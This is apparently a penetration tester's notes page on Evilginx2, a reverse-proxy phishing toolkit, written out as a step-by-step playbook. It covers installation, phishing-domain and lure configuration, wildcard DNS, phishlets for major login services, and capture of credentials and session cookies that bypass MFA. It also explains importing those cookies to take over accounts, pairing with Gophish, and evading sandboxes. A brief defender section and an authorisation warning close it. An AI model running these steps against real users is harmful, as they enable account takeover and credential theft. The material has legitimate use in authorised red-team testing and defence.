---
tags: [pentest, evilginx, aitm, mfa-bypass, phishing, both, initial-access, web]
tool: evilginx2
phase: 5
---
# Evilginx2 - AiTM (Adversary-in-the-Middle)

A reverse-proxy phishing toolkit that captures both credentials AND session cookies, **bypassing MFA**.

[[06 - Gaining Access/00 - README|Folder index]]

## How it works

Victim browses your phishing domain → Evilginx proxies to the real site → user logs in normally (including MFA) → real site sets session cookies → Evilginx captures those cookies → attacker imports cookies into their browser → logged in as victim.

## Install

```bash
# Build from source (Go required)
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
./build/evilginx
```

## Concepts

| Term | Meaning |
| --- | --- |
| **phishlet** | YAML config defining target site (URL patterns, cookies to capture) |
| **lure** | A URL on your phishing domain that redirects to the target |
| **session** | A captured login (creds + cookies) |

## Setup

```bash
# In evilginx shell
config domain corp-it.net           # your phishing domain
config ipv4 external 10.10.14.5     # your external IP
config redirect_url https://corp.com  # where to send people who hit / by accident

# Load a phishlet (for M365)
phishlets hostname o365 login.corp-it.net
phishlets enable o365

# Create a lure
lures create o365
lures get-url 0                     # the URL to send to victims
lures edit 0 redirect_url https://corp.com/welcome
```

## DNS

Point your phishing domain's wildcard A record at your Evilginx IP:

```text
*.corp-it.net    A    10.10.14.5
corp-it.net      A    10.10.14.5
```

Evilginx auto-fetches Let's Encrypt certs at startup.

## Phishlets available

```text
o365            Microsoft 365 / Office 365
google          Google
linkedin        LinkedIn
facebook        Facebook
twitter         Twitter / X
github          GitHub
amazon          Amazon
okta            Okta SSO
duo             Duo Security
```

Community has many more on GitHub.

## During a campaign

```text
evilginx > sessions       # list captured sessions
evilginx > sessions 1     # view details: creds + cookies
```

Cookies output is JSON - import into a browser via "Cookie Editor" extension to take over the session.

## Combine with Gophish

```text
1. Gophish sends the email with a link to corp-it.net/lure
2. Evilginx serves the proxied login page
3. Victim authenticates + MFA → session cookies captured
4. You import the cookies → logged in as them
```

## Hardening / OpSec

- Use a believable domain.
- Configure Evilginx to redirect bots / sandboxes elsewhere (`unauth_url`).
- Time-limit lures (`lures edit 0 ua_filter`).
- Pre-stage payloads on a separate domain.

## Detection (defender's side)

- Conditional Access: require **device compliance** + **trusted location** - kills AiTM because attacker IP isn't compliant/trusted.
- FIDO2 / hardware keys (passkeys) bind to origin - AiTM proxy fails the origin check.
- Token Protection / Continuous Access Evaluation (CAE) - Microsoft's mitigation.
- Detect anomalous "session reuse from unfamiliar IP / device" alerts.

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| TLS cert errors at the lure URL | Let's Encrypt rate-limit; wait, or use a staging domain |
| Phishlet doesn't proxy correctly | Target updated its login flow. Phishlet needs maintenance. |
| MFA prompt loops | Sub-resource fetched directly (not via Evilginx). Update phishlet rules. |
| All sessions show "blocked" | Conditional access kicked in. Phishlet won. |

> [!warning] Highest-impact phishing technique - matched by highest-impact rules of engagement requirements.
> AiTM bypasses MFA. Get the most explicit possible written approval. Document every step.
